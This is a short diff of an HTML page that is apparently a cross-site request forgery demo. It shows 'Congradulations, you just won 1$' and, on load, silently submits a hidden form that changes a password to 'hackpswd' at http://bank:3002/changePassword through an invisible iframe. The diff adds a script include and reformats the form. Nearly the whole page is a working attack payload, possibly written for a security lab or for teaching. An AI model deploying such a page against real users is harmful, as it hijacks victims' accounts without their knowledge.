@@ -3,10 +3,15 @@
 <head>
     <meta charset="UTF-8">
     <title>Title</title>
+    <script src="/javascripts/main.js"></script>
 </head>
 <body onload="document.hackForm.submit()">
 Congradulations, you just won 1$
-<form action="http://bank:3002/changePassword" method="post" name="hackForm" style="display: none" target="hidden">
+<form action="http://bank:3002/changePassword"
+      method="post"
+      name="hackForm"
+      style="display: none"
+      target="hidden">
     <input type="text" id="pass" name="password" value="hackpswd">
 </form>
 <iframe name="hidden" style="display: none"></iframe>
